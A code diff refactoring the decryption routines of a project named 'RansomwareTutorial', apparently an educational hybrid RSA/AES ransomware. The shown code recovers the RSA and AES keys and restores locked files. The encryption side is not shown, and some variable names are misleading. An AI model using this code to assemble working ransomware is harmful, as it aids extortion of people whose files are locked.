@@ -1,4 +1,5 @@
-﻿using RansomwareTutorial.Models;
+﻿using RansomwareTutorial.Helpers;
+using RansomwareTutorial.Models;
 using System;
 using System.Collections;
 using System.Collections.Generic;
@@ -12,19 +13,31 @@ namespace RansomwareTutorial.Controllers
 {
     public static class DecryptionProcessor
     {
-        public static bool LocateClientPrivateKeyAndDecrypt(string clientRsaPrivateKeyLocation, string serverRsaPrivateKeyLocation)
+        public static string GetPrivateKeyFromServer(string serverRsaPrivateKeyLocation, ref bool isHealthy)
         {
-            var clientRsaPrivateKey = File.ReadAllBytes(clientRsaPrivateKeyLocation);
+            if (!isHealthy)
+                return null;
+
             var rsaServerPrivateKey = File.ReadAllText(serverRsaPrivateKeyLocation);
+            return rsaServerPrivateKey;
+        }
+
+        public static void LocateClientPrivateKeyAndDecrypt(string clientRsaPrivateKeyLocation, string rsaServerPrivateKey, ref bool isHealthy)
+        {
+            if (!isHealthy)
+                return;
+
+            var clientRsaPrivateKey = File.ReadAllBytes(clientRsaPrivateKeyLocation);
 
             var privateKeyEncrypted = CryptoHelper.DecryptLongRSA(clientRsaPrivateKey, rsaServerPrivateKey);
             File.WriteAllBytes(clientRsaPrivateKeyLocation, privateKeyEncrypted);
-
-            return true;
         }
 
-        public static bool DecryptAESKeys(string aesLocation, string clientRsaPrivateKeyLocation)
+        public static void DecryptAESKeys(string aesLocation, string clientRsaPrivateKeyLocation, ref bool isHealthy)
         {
+            if (!isHealthy)
+                return;
+
             var aesKeysLocations = Directory.GetFiles(aesLocation, "*", SearchOption.TopDirectoryOnly);
             var rsaServerPrivateKey = File.ReadAllText(clientRsaPrivateKeyLocation);
 
@@ -33,12 +46,13 @@ namespace RansomwareTutorial.Controllers
                 var aesEncrypted = CryptoHelper.DecryptRSA(File.ReadAllBytes(file), rsaServerPrivateKey);
                 File.WriteAllBytes(file, aesEncrypted);
             }
-
-            return true;
         }
 
-        public static bool DecryptLockedFiles(string aesLocation, string lockedDataLocation)
+        public static void DecryptLockedFiles(string aesLocation, string lockedDataLocation, ref bool isHealthy)
         {
+            if (!isHealthy)
+                return;
+
             var filesLocked = Directory.GetFiles(lockedDataLocation, "*", SearchOption.TopDirectoryOnly);
 
             foreach (var file in filesLocked)
@@ -49,10 +63,8 @@ namespace RansomwareTutorial.Controllers
                 var aesKey = CryptoHelper.GenerateAESKey(key, iv);
                 var decryptor = aesKey.CreateDecryptor();
                 var fileBytes = File.ReadAllBytes(file);
-                CryptoHelper.CryptoAES(decryptor, file, fileBytes, lockedDataLocation);
+                CryptoHelper.CryptoTransformAES(decryptor, file, fileBytes, lockedDataLocation);
             }
-
-            return true;
         }
     
     }
